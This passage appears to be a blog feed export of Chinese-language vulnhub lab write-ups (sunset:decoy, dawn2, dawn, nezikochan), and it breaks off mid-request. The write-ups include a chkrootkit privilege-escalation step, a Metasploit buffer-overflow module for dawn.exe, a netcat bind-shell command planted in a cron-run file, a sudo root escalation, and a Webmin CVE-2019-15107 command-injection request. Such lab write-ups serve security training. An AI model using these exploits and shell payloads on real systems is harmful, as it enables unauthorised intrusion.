class="line">Steps to reproduce:</span><br><span class="line"></span><br><span class="line">- Put an executable file named &#x27;update&#x27; with non-root owner in /tmp (not</span><br><span class="line">mounted noexec, obviously)</span><br><span class="line">- Run chkrootkit (as uid 0)</span><br></pre></td></tr></table></figure><p>åœ¨<code>/tmp</code>ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ª<code>update</code>æ–‡ä»¶ï¼ˆå¯æ‰§è¡Œçš„ï¼‰å³å¯</p><img src="sunset:decoy/image-20200711001648434.png" alt="image-20200711001648434" style="zoom:33%;" /><p>å†™å…¥ä¸€ä¸ªåå¼¹shell</p><p>å¹¶ä¸”ç»™æ‰§è¡Œæƒé™</p><img src="sunset:decoy/image-20200711001728284.png" alt="image-20200711001728284" style="zoom:33%;" /><p>æœ¬åœ°ç›‘å¬ï¼Œè¿è¡Œ</p><img src="sunset:decoy/image-20200711001746820.png" alt="image-20200711001746820" style="zoom:33%;" />]]></content>
      
      
      <categories>
          
          <category> exploit </category>
          
          <category> sunset </category>
          
      </categories>
      
      
        <tags>
            
            <tag> exploit </tag>
            
            <tag> enum </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub sunset:dawn2é¶æœº</title>
      <link href="/sunset-dawn2.html"/>
      <url>/sunset-dawn2.html</url>
      
        <content type="html"><![CDATA[<p>vulnhubé‡Œçš„ sunset:dawn2 é¶æœº</p><p>ç®€å•/ä¸­ç­‰éš¾åº¦</p><a id="more"></a><h1 id="sunset-dawn2"><a href="#sunset-dawn2" class="headerlink" title="sunset:dawn2"></a>sunset:dawn2</h1><p><font color='red'>å›åˆ°äº†åšpwnçš„æ—¶å€™å‘¢</font></p><p>çœç•¥æ‰ä¸»æœºå‘ç°å’Œç«¯å£æ‰«æ</p><img src="sunset:dawn2/image-20200713090452736.png" alt="image-20200713090452736" style="zoom:33%;" /><p>å…¶å®è¿˜æœ‰ä¸€ä¸ªç«¯å£ï¼Œä¸å¤ªç¨³å®š</p><h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><p>ä½¿ç”¨<code>dirbuster</code>æ‰«æç›®å½•</p><p>å¾—åˆ°ä¸€ä¸ª<code>save.zip</code>ï¼Œè§£å‹ä¹‹åæ˜¯ä¸€ä¸ªexeæ–‡ä»¶å’Œä¸€ä¸ª<code>README</code></p><img src="sunset:dawn2/image-20200713090633493.png" alt="image-20200713090633493" style="zoom:33%;" /><p>åº”è¯¥æ˜¯è¦æ—¥è¿™ä¸ªexeçš„æ„æ€</p><h2 id="dawn-exe"><a href="#dawn-exe" class="headerlink" title="dawn.exe"></a>dawn.exe</h2><p>ä½¿ç”¨ida åç¼–è¯‘è¿™ä¸ªç¨‹åº</p><p><code>main</code>å‡½æ•°è¿è¡Œäº†<code>main_0</code></p><p>æ˜¯ä¸€ä¸ª<code>socket</code>çš„ç¨‹åº</p><h3 id="main-0"><a href="#main-0" class="headerlink" title="main_0"></a>main_0</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main_0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v0; <span class="comment">// al</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">WSAData</span> <span class="title">WSAData</span>;</span> <span class="comment">// [esp+0h] [ebp-1C4h]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">name</span>;</span> <span class="comment">// [esp+190h] [ebp-34h]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">addr</span>;</span> <span class="comment">// [esp+1A0h] [ebp-24h]</span></span><br><span class="line">  <span class="keyword">int</span> addrlen; <span class="comment">// [esp+1B0h] [ebp-14h]</span></span><br><span class="line">  SOCKET s; <span class="comment">// [esp+1B4h] [ebp-10h]</span></span><br><span class="line">  SOCKET v7; <span class="comment">// [esp+1B8h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *buf; <span class="comment">// [esp+1BCh] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> len; <span class="comment">// [esp+1C0h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  buf = (<span class="keyword">char</span> *)j__malloc(<span class="number">0x401</span>u);</span><br><span class="line">  WSAStartup(<span class="number">0x202</span>u, &amp;WSAData);</span><br><span class="line">  s = socket(<span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  sub_34573918(aTheServerHasBe, WSAData.wVersion);</span><br><span class="line">  name.sa_family = <span class="number">2</span>;</span><br><span class="line">  *(_DWORD *)&amp;name.sa_data[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_WORD *)name.sa_data = htons(<span class="number">0x7C1</span>u);</span><br><span class="line">  bind(s, &amp;name, <span class="number">16</span>);</span><br><span class="line">  listen(s, <span class="number">1</span>);</span><br><span class="line">  j__puts(aTheServerIsCur);</span><br><span class="line">  addrlen = <span class="number">16</span>;</span><br><span class="line">  v7 = accept(s, &amp;addr, &amp;addrlen);</span><br><span class="line">  ntohs(*(u_short *)addr.sa_data);</span><br><span class="line">  inet_ntoa(*(struct in_addr *)&amp;addr.sa_data[<span class="number">2</span>]);</span><br><span class="line">  sub_34573918(aAConnectionHas, v7);</span><br><span class="line">  <span class="keyword">for</span> ( len = <span class="number">1</span>; len; send(v7, buf, len, <span class="number">0</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    len = recv(v7, buf, <span class="number">1024</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( len == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      closesocket(v7);</span><br><span class="line">      j__exit(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    buf[len] = <span class="number">32</span>;</span><br><span class="line">    sub_3457114F(buf);</span><br><span class="line">    ntohs(*(u_short *)addr.sa_data);</span><br><span class="line">    v0 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)inet_ntoa(*(struct in_addr *)&amp;addr.sa_data[<span class="number">2</span>]);</span><br><span class="line">    sub_34573918(&amp;unk_345CB0A4, v0);</span><br><span class="line">  &#125;</span><br><span class="line">  closesocket(v7);</span><br><span class="line">  WSACleanup();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="sub-3457114F"><a href="#sub-3457114F" class="headerlink" title="sub_3457114F"></a>sub_3457114F</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__cdecl <span class="title">sub_3457114F</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> sub_34576730(a1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *__cdecl <span class="title">sub_34576730</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [esp+0h] [ebp-10Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> j__strcpy(&amp;v2, a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ˜¾ç„¶ï¼Œå­˜åœ¨æ ˆæº¢å‡ºã€‚junkçš„å¤§å°æ˜¯<code>0x10C + 0x4(ebp) = 0x110</code></p><h3 id="jmp-esp"><a href="#jmp-esp" class="headerlink" title="jmp esp"></a>jmp esp</h3><p>ä½¿ç”¨msf çš„ä¸€ä¸ªå·¥å…·<code>msfbinscan</code></p><img src="sunset:dawn2/image-20200713091419492.png" alt="image-20200713091419492" style="zoom:33%;" /><p>é€‰ç”¨é‚£ä¸ª<code>0x34581777</code></p><p>å¥—ç”¨windowsæ ˆæº¢å‡ºçš„æ¨¡æ¿</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">require <span class="string">&#x27;msf/core&#x27;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Metasploit3</span> &lt; <span class="title">Msf</span>:</span>:Exploit::Remote</span><br><span class="line">  Rank = NormalRanking</span><br><span class="line">  include Msf::Exploit::Remote::Tcp</span><br><span class="line">  include Msf::Exploit::Powershell</span><br><span class="line">  include Msf::Exploit::EXE</span><br><span class="line">  include Msf::Exploit::WbemExec</span><br><span class="line">  include Msf::Auxiliary::Report</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">initialize</span>(<span class="params">info = &#123;&#125;</span>)</span></span><br><span class="line"><span class="function">  <span class="title">super</span>(<span class="params">update_info(<span class="params">info,</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">    <span class="string">&#x27;Name&#x27;</span> =&gt; <span class="string">&#x27;Stack Based Buffer Overflow Example&#x27;</span>,</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">    <span class="string">&#x27;Description&#x27;</span> =&gt; %q&#123;</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">      Stack Based Overflow Example Application Exploitation Module</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">    &#125;,</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">    <span class="string">&#x27;Platform&#x27;</span> =&gt; <span class="string">&#x27;Windows&#x27;</span>,</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">    <span class="string">&#x27;Author&#x27;</span> =&gt; </span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">      [</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">        <span class="string">&#x27;stdout&#x27;</span></span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">      ],</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">      </span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">     <span class="string">&#x27;Payload&#x27;</span> =&gt;</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">      &#123;</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">        <span class="string">&#x27;space&#x27;</span> =&gt; <span class="number">1000</span>,</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">        <span class="string">&#x27;BadChars&#x27;</span> =&gt; <span class="string">&quot;\x20\x0a\x0d\x00\xff&quot;</span></span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">      &#125;,</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">     <span class="string">&#x27;Targets&#x27;</span> =&gt;</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">      [</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">        [<span class="string">&#x27;linux&#x27;</span>, &#123;<span class="string">&#x27;Ret&#x27;</span> =&gt; <span class="number">0x34581777</span>, <span class="string">&#x27;Offset&#x27;</span> =&gt; <span class="number">0x110</span>&#125;]</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">         <span class="comment">#[&#x27;linux&#x27;, &#123;&#x27;Ret&#x27; =&gt; 0x52501510, &#x27;Offset&#x27; =&gt; 13&#125;]</span></span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">      ],</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">     <span class="string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="string">&#x27;2019-01-15&#x27;</span></span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">  </span>)</span>)</span></span><br><span class="line"><span class="function">  </span></span><br><span class="line"><span class="function">  <span class="title">register_options</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">  [</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="comment">#Opt::RPORT(1435)</span></span></span></span><br><span class="line"><span class="function"><span class="params">      Opt::RPORT(<span class="params"><span class="number">1985</span></span>)</span></span></span><br><span class="line"><span class="function"><span class="params">  ],self.<span class="keyword">class</span></span>)</span></span><br><span class="line"><span class="function">  <span class="title">end</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line"><span class="function">  <span class="title">def</span> <span class="title">exploit</span></span></span><br><span class="line"><span class="function">    <span class="title">connect</span></span></span><br><span class="line">    buf = make_nops(target[&#x27;Offset&#x27;])</span><br><span class="line">    <span class="comment">#buf = &quot;\x90&quot; * 13</span></span><br><span class="line">    buf = buf + [target[<span class="string">&#x27;Ret&#x27;</span>]].pack(<span class="string">&#x27;V&#x27;</span>) + make_nops(<span class="number">20</span>) + payload.encoded + <span class="string">&quot;\x00&quot;</span></span><br><span class="line">    sock.put(buf)</span><br><span class="line">    handler</span><br><span class="line">    disconnect</span><br><span class="line">   end</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h2 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h2><img src="sunset:dawn2/image-20200713092422650.png" alt="image-20200713092422650" style="zoom:33%;" /><p>pwnæ‰äº†<code>dawn.exe</code>ï¼Œä½†æ˜¯æ‰“ä¸å¼€shellï¼ˆåŸç³»ç»Ÿæ˜¯Linuxå§ï¼‰</p><img src="sunset:dawn2/image-20200713210708410.png" alt="image-20200713210708410" style="zoom:33%;" /><p>æœ‰ä¸€ä¸ª<code>dawn-BETA.exe</code>(å¹¶ä¸”æ˜¯rootç”¨æˆ·çš„)ï¼ŒçŒœæµ‹å¦ä¸€ä¸ªç«¯å£è¿è¡Œçš„å°±æ˜¯è¿™ä¸ªï¼Œä½¿ç”¨<code>download</code> å‘½ä»¤ä¸‹è½½ä¸‹æ¥</p><img src="sunset:dawn2/image-20200713210727525.png" alt="image-20200713210727525" style="zoom:33%;" /><p>å‘ç°å’Œ<code>dawn.exe</code>å·®ä¸å¤šï¼Œç…§è‘«èŠ¦ç”»ç“¢å°±å¯ä»¥pwnæ‰</p><p>å¾—åˆ°rootæƒé™</p><img src="sunset:dawn2/image-20200713211748904.png" alt="image-20200713211748904" style="zoom:33%;" />]]></content>
      
      
      <categories>
          
          <category> exploit </category>
          
          <category> sunset </category>
          
      </categories>
      
      
        <tags>
            
            <tag> exploit </tag>
            
            <tag> stack_overflow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub sunset:dawné¶æœº</title>
      <link href="/sunset-dawn.html"/>
      <url>/sunset-dawn.html</url>
      
        <content type="html"><![CDATA[<p>vulnhubé‡Œçš„ sunset:dawn é¶æœº</p><p>ç®€å•éš¾åº¦</p><a id="more"></a><h1 id="Sunset-dawn"><a href="#Sunset-dawn" class="headerlink" title="Sunset:dawn"></a>Sunset:dawn</h1><p>(ä¸»æœºå‘ç°å’Œç«¯å£æ‰«æç•¥è¿‡äº†)</p><img src="sunset:dawn/image-20200711163441204.png" alt="image-20200711163441204" style="zoom:33%;" /><p>ç»“æœå°±æ˜¯å¼€äº†è¿™äº›ç«¯å£</p><img src="sunset:dawn/image-20200711164203753.png" alt="image-20200711164203753" style="zoom:25%;" /><h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><p>è®¿é—®ä¹‹å</p><img src="sunset:dawn/image-20200711163515781.png" alt="image-20200711163515781" style="zoom:33%;" /><p>å—¯å—¯å—¯ï¼Ÿï¼Ÿç”šè‡³æ²¡æœ‰<code>robots.txt</code></p><p>æ‰€ä»¥ç”¨<code>dirbuster</code>çˆ†ç ´ä¸€ä¸‹ç›®å½•</p><img src="sunset:dawn/image-20200711163816987.png" alt="image-20200711163816987" style="zoom:33%;" /><p>çœ‹åˆ°äº†<code>/logs</code>ç›®å½•ï¼Œæ‰“å¼€çœ‹çœ‹</p><img src="sunset:dawn/image-20200711163856125.png" alt="image-20200711163856125" style="zoom:33%;" /><p>åªæœ‰æœ€åä¸€ä¸ªå¯ä»¥æ‰“å¼€ï¼Œ</p><img src="sunset:dawn/image-20200711163932597.png" alt="image-20200711163932597" style="zoom:33%;" /><p>çœ‹ç€åƒæ˜¯æ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡<code>/home/dawn/ITDEPT</code>ç›®å½•ä¸‹çš„<code>product-control</code> <code>web-control</code>æ–‡ä»¶</p><p>æ‰€ä»¥æƒ³çš„æ˜¯ä¸Šä¼ æ–‡ä»¶ï¼Œçœ‹åˆ°äº†ç«¯å£æ‰«ææ—¶å€™çš„smb</p><h2 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h2><p>ä½¿ç”¨<code>smbclient</code>å·¥å…·æ‰«æä¸€ä¸‹ç›®å½•</p><img src="sunset:dawn/image-20200711164258852.png" alt="image-20200711164258852" style="zoom:33%;" /><p><code>ITDEPT</code>è¿˜çœŸçš„æœ‰</p><p>åˆ›å»ºæ–‡ä»¶<code>echo &quot;nc -e /bin/bash -vlp 8848 &amp;&quot; &gt; web-control</code>ï¼Œä¸Šä¼ æ–‡ä»¶</p><img src="sunset:dawn/image-20200711164558000.png" alt="image-20200711164558000" style="zoom:33%;" /><p>è¿æ¥ä¸Šå»ï¼Œå¾—åˆ°ä¸€ä¸ªshell</p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><img src="sunset:dawn/image-20200711164732972.png" alt="image-20200711164732972" style="zoom:33%;" /><p>æ¥ä¸ªå¥½ç‚¹çš„shellï¼Œ<code>python -c &quot;import pty; pty.spawn(&#39;/bin/bash&#39;);&quot;</code></p><img src="sunset:dawn/image-20200711164837491.png" alt="image-20200711164837491" style="zoom:33%;" /><p>æ‰¾ä¸€ä¸‹ææƒçš„ï¼Œ<code>sudo -l</code></p><img src="sunset:dawn/image-20200711164928573.png" alt="image-20200711164928573" style="zoom:33%;" /><p>å¦ä¸€ä¸ªç«¯å£çš„æ˜¯<code>www-data</code></p><img src="sunset:dawn/image-20200711165046978.png" alt="image-20200711165046978" style="zoom:33%;" /><p>è€Œä»–å¯ä»¥ç›´æ¥è¿è¡Œsudo</p><p>é‚£å°±ç›´æ¥<code>sudo -u root /usr/bin/sudo /bin/bash</code></p><img src="sunset:dawn/image-20200711165130024.png" alt="image-20200711165130024" style="zoom:33%;" /><blockquote><p>  flag æ–‡ä»¶é‡Œè¯´æœ‰åˆ«çš„getshellçš„æ–¹æ³•ï¼Œå¹¶ä¸”æœ‰4ç§ææƒçš„æ–¹æ³•</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> exploit </category>
          
          <category> sunset </category>
          
      </categories>
      
      
        <tags>
            
            <tag> exploit </tag>
            
            <tag> smb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub nezikochané¶æœº</title>
      <link href="/nezikochan.html"/>
      <url>/nezikochan.html</url>
      
        <content type="html"><![CDATA[<p>vulnhubé‡Œçš„ nezikochan é¶æœº</p><p>åˆå­¦è€…éš¾åº¦</p><a id="more"></a><h1 id="nezukochan"><a href="#nezukochan" class="headerlink" title="nezukochan"></a>nezukochan</h1><h2 id="ä¸»æœºå‘ç°"><a href="#ä¸»æœºå‘ç°" class="headerlink" title="ä¸»æœºå‘ç°"></a>ä¸»æœºå‘ç°</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/home/kali# ifconfig</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.2.143  netmask 255.255.255.0  broadcast 192.168.2.255</span><br><span class="line">        inet6 fe80::20c:29ff:fe8d:d790  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:8d:d7:90  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 16971  bytes 6082662 (5.8 MiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 17155  bytes 1515848 (1.4 MiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/home/kali# nmap -Pn 192.168.2.0/24</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.2.156</span><br><span class="line">Host is up (0.00096s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:16:32:FD (VMware)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/home/kali# nmap -Pn 192.168.2.156 -p0-65535 -A</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE  VERSION</span><br><span class="line">22/tcp    open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 4b:f5:b3:ff:35:a8:c8:24:42:66:64:a4:4b:da:b0:16 (RSA)</span><br><span class="line">|   256 2e:0d:6d:5b:dc:fe:25:cb:1b:a7:a0:93:20:3a:32:04 (ECDSA)</span><br><span class="line">|_  256 bc:28:8b:e4:9e:8d:4c:c6:42:ab:0b:64:ea:8f:60:41 (ED25519)</span><br><span class="line">80/tcp    open  http     Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Welcome to my site! - nezuko kamado</span><br><span class="line">13337/tcp open  ssl/http MiniServ 1.920 (Webmin httpd)</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/</span><br><span class="line">|_http-title: Login to Webmin</span><br><span class="line">| ssl-cert: Subject: commonName=*/organizationName=Webmin Webserver on ubuntu</span><br><span class="line">| Not valid before: 2019-08-20T09:28:46</span><br><span class="line">|_Not valid after:  2024-08-18T09:28:46</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br></pre></td></tr></table></figure><p>ç›®æ ‡å¼€å¯äº† <code>22(ssh)</code> <code>80(http)</code> <code>13337(webadmin)</code></p><h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><img src="nezikochan/image-20200706152016523.png" alt="image-20200706152016523" style="zoom:50%;" /><p>ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œä½¿ç”¨<code>dirbuster</code> æ‰«ç›®å½•ï¼Œä¹Ÿæ²¡ä»€ä¹ˆä¸œè¥¿</p><p><code>robots.txt</code> æœ‰ä¸€æ®µ<code>basexx</code> åŠ å¯†çš„ä¸œè¥¿ï¼Œbaseå…¨å®¶æ¡¶ä¸€æŠŠæ¢­ï¼Œå‘ç°æ˜¯<code>base32</code>ï¼Œè§£å¯†ä¹‹å</p><img src="nezikochan/image-20200706152237275.png" alt="image-20200706152237275" style="zoom:50%;" /><p>é‚£ä¹ˆåº”è¯¥å°±æ˜¯<code>13337</code>ç«¯å£äº†</p><h2 id="webadmin"><a href="#webadmin" class="headerlink" title="webadmin"></a>webadmin</h2><img src="nezikochan/image-20200706152334542.png" alt="image-20200706152334542" style="zoom:50%;" /><p>åšåˆ°è¿™é‡Œå¡ä½äº†</p><p>æ‰¾åˆ°äº†ç½‘ä¸Šçš„wpï¼Œä½¿ç”¨çš„æ˜¯<code>CVE-2019-15231(15701)</code></p><p><a href="https://github.com/jas502n/CVE-2019-15107">https://github.com/jas502n/CVE-2019-15107</a></p><p>ä¿®æ”¹è¯·æ±‚åŒ…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;password_change.cgi HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.2.156:13337</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: redirect&#x3D;1; testing&#x3D;1; sid&#x3D;x; sessiontest&#x3D;1</span><br><span class="line">Referer: https:&#x2F;&#x2F;192.168.2.156:13337&#x2F;session_login.cgi</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 60</span><br><span class="line"></span><br><span class="line">user&#x3D;rootxx&amp;pam&#x3D;&amp;expired&#x3D;2&amp;old&#x3D;test|id&amp;new1&#x3D;test2&amp;new2&#x3D;test2</span><br></pre></td></tr></table></figure><p>Response</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span></span><br><span class="line">Failed to change password : The current password is incorrectuid=1000(nezuko) gid=1000(nezuko) groups=1000(nezuko),4(adm),24(cdrom),30(dip),46(plugdev),116(lpadmin),126(sambashare)</span><br><span class="line"><span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="reverse-shell"><a href="#reverse-shell" class="headerlink" title="reverse_shell"></a>reverse_shell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;password_change.cgi HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.2.156:13337</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; 